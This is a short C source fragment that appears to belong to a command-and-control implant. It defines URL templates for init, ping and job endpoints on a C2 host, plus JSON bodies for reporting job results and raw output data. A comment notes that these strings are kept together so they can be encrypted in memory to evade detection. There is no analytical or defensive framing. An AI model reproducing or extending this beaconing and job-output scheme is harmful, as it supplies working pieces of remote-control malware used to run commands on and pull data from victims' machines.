/**
 *  All C2 configurations placed here in order to have it encrypted in memory.
*/
const char* URL_INIT = "http://"  C2HOST  "/";
const char* URL_PING = "http://" C2HOST "/ping/%s";
const char* URL_JOB = "http://" C2HOST "/job/%s";
const char* BODY_JOB = "{\"code\":%s}";
const char* BODY_JOB_OUTPUT = "{\"code\":%s, \"encoding\":\"raw\", \"data\":\"%s\"}";